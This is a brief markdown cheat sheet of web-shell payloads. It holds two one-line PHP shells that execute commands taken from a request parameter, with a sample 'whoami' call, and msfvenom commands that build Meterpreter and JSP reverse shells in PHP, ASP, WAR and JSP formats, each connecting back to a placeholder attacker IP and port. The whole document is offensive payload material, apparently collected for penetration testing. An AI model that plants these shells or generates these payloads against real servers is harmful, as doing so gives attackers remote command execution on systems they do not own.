# Web Shells

```php
<?php system($_REQUEST['cmd']); ?>
xxx.php?cmd=whoami
```

```php
<?php echo shell_exec($_REQUEST["cmd"]); ?>
```

## Meterpreter Reverse Shell
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > [NAME].php; cat [NAME].php | pbcopy && echo '<?php ' | tr -d '\n' > [NAME].php && pbpaste >> [NAME].php
```

## PHP
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > [NAME].php
```

## ASP/ASPX
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f asp > [NAME].asp
```

## WAR
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war > [NAME].war
```

## JSP
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > [NAME].jsp
```
